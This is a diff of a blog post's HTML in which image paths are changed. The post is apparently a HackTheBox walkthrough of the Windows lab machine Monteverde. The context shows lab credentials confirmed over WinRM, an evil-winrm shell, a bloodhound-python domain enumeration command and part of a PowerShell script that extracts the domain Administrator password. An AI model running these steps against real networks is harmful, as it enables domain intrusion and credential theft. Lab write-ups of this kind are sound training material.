@@ -208,7 +208,7 @@ SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0
 SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
 HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
 WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
-</code></pre><ul><li>We can <code>evil-winrm</code></li></ul><p><img src=./images/1.png></p><ul><li>By the way, we could&rsquo;ve also checked the domain information using <code>bloodhound-python</code><ul><li><code>bloodhound-python -c all -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -ns 10.10.10.172 --zip</code></li></ul></li></ul><h2 id=root>Root</h2><ul><li><code>mhope</code> user</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; whoami /priv
+</code></pre><ul><li>We can <code>evil-winrm</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/monteverde/images/1.png></p><ul><li>By the way, we could&rsquo;ve also checked the domain information using <code>bloodhound-python</code><ul><li><code>bloodhound-python -c all -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -ns 10.10.10.172 --zip</code></li></ul></li></ul><h2 id=root>Root</h2><ul><li><code>mhope</code> user</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -253,7 +253,7 @@ $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &#34;Serv
 $client.Open()
 $cmd = $client.CreateCommand()
 ...
-</code></pre><ul><li>Let&rsquo;s run the <code>poc</code><ul><li><code>Administrator:d0m@in4dminyeah!</code></li></ul></li></ul><p><img src=./images/2.png></p><ul><li>Now let&rsquo;s get our flag</li></ul><p><img src=./images/3.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>Let&rsquo;s run the <code>poc</code><ul><li><code>Administrator:d0m@in4dminyeah!</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/monteverde/images/2.png></p><ul><li>Now let&rsquo;s get our flag</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/monteverde/images/3.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmonteverde%2f&text=%5bHTB%5d%20Machine%3a%20Monteverde&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmonteverde%2f&title=%5bHTB%5d%20Machine%3a%20Monteverde" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmonteverde%2f&title=%5bHTB%5d%20Machine%3a%20Monteverde" target=_blank><i class="fab fa-linkedin"></i>
